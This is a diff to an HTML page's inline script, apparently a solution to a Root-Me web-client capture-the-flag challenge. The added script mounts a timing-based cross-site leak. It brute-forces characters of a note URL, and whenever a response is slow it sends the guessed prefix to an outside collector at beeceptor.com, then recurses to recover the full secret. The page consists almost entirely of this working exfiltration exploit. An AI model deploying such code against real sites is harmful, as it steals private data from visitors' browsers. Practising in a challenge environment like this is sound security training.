@@ -132,14 +132,41 @@
 </div>
 
 <script>
-    fetch('http://challenge01.root-me.org:58003/profile')
-    .then(response => response.text())
-    .then(html => {
-        console.log(html);  // Outputs the HTML of the page
-    })
-    .catch(error => {
-        console.log('Error fetching the page:', error);
-    });
+const characters = 'abcdefghijklmnopqrstuvwxyz0123456789_';
+
+function makeRequest(url, added) {
+    const startTime = Date.now();
+
+    fetch(url)
+        .then(response => response.text())
+        .then(data => {
+            const endTime = Date.now();
+            const duration = endTime - startTime;
+
+            if (duration > 2000) {
+             	fetch("https://rootmeleak.free.beeceptor.com/" + added);
+		console.log(`Requête trop lente : ${url}`);
+                
+		let i = 0;
+                while(i < characters.length) {
+                    const newChar = characters[i];
+                    const newUrl = url + newChar;
+                    makeRequest(newUrl, added + newChar);
+		    i+=1;
+                }
+            }
+        })
+        .catch(error => {
+            console.error('Erreur lors de la requête :', error);
+        });
+}
+
+const baseUrl = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/2278/';
+
+for (let char of characters) {
+    const newUrl = baseUrl + char;
+    makeRequest(newUrl, char);
+}
 </script>
     
 </body>
